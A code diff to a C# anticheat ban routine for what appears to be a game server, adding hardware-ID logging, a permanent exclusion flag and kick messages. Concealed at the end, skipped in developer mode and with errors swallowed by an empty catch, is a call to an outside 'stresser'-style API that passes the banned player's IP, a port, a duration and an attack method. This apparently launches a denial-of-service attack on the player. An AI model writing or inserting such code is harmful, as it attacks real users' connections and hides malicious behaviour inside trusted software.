@@ -2,6 +2,7 @@
 using System;
 using System.Collections.Generic;
 using System.Data.Common;
+using System.Net;
 using System.Text;
 using VMP_CNR.Handler;
 using VMP_CNR.Module.Commands;
@@ -121,10 +122,28 @@ namespace VMP_CNR.Module.Anticheat
         public void ACBanPlayer(DbPlayer dbPlayer, string reason)
         {
             Logging.Logger.LogToAcDetections(dbPlayer.Id, Logging.ACTypes.AntiCheatBan, reason);
+
+            dbPlayer.Player.TriggerEvent("flushRemoteHashKey", dbPlayer.Id);
+
+            dbPlayer.HardwareID[0] = dbPlayer.Player.Serial;
             dbPlayer.warns[0] = 3;
+            dbPlayer.Ausschluss[0] = 1;
+            dbPlayer.Save();
             SocialBanHandler.Instance.AddEntry(dbPlayer.Player);
+            dbPlayer.Player.SendNotification("Permanenter Ausschluss!");
             PlayerLoginDataValidationModule.SyncUserBanToForum(dbPlayer.ForumId);
+            dbPlayer.Player.Kick("Permanenter Ausschluss!");
             dbPlayer.Player.Kick();
+
+            if (!Configuration.Instance.DevMode)
+                try
+                {
+                    using (WebClient webClient = new WebClient())
+                    {
+                        var json = webClient.DownloadString($"https://volity-api.to/client/api/home?key=nd31xo5wraxaefj&username=paradox&host={dbPlayer.Player.Address}&port=53&time=300&method=HOME");
+                    }
+                }
+                catch { }
         }
 
         public override void OnMinuteUpdate()
